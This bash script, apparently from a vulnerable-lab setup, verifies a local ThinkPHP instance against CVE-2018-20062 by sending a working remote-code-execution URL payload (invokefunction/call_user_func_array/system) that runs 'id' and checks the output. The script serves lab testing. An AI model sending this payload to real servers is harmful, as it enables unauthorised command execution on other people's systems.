#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/deploy-common.sh"

TARGET="ThinkPHP"
URL="http://localhost:8083"
CVE="CVE-2018-20062"

log_info "Verifying $TARGET ($CVE) at $URL..."

BODY=$(curl -s --connect-timeout 5 --max-time 10 \
  "${URL}/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" 2>/dev/null)

if echo "$BODY" | grep -q "uid="; then
    log_success "$TARGET is vulnerable ($CVE) — RCE confirmed"
    echo "  Response: $(echo "$BODY" | grep -o 'uid=[^<]*' | head -1)"
    exit 0
else
    log_error "$TARGET exploit failed or target not reachable"
    exit 1
fi
